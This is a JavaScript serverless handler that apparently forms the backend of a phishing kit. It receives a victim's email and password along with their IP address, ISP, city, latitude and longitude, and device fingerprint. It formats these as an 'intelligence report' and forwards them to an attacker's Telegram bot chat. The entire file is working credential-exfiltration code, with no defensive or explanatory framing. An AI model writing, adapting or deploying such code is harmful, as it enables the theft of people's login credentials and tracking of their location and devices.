export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

    const data = req.body;
    const token = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    // تنسيق التقرير الاستخباري (Markdown)
    const report = `
📊 *INTELLIGENCE REPORT* 📊
----------------------------------
👤 *VICTIM CREDENTIALS:*
📧 Email: \`${data.user}\`
🔑 Pass: \`${data.pass}\`

🌐 *NETWORK INFORMATION:*
📍 IP: \`${data.network.ip}\`
🏢 ISP: \`${data.network.org || 'N/A'}\`
🌍 Location: \`${data.network.city}, ${data.network.region}, ${data.network.country_name}\`
🛰️ Lat/Long: \`${data.network.latitude}, ${data.network.longitude}\`

📱 *HARDWARE & DEVICE:*
💻 OS: \`${data.device.plt}\`
🧠 CPU Cores: \`${data.device.cores}\`
💾 RAM (Approx): \`${data.device.mem} GB\`
🖥️ Res: \`${data.device.res}\`
🕒 Timezone: \`${data.device.tz}\`

🌐 *BROWSER AGENT:*
\`${data.device.ua}\`
----------------------------------
    `;

    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: report,
                parse_mode: "Markdown"
            })
        });
        return res.status(200).json({ status: 'Report Delivered' });
    } catch (error) {
        return res.status(500).json({ error: 'Delivery Failed' });
    }
}
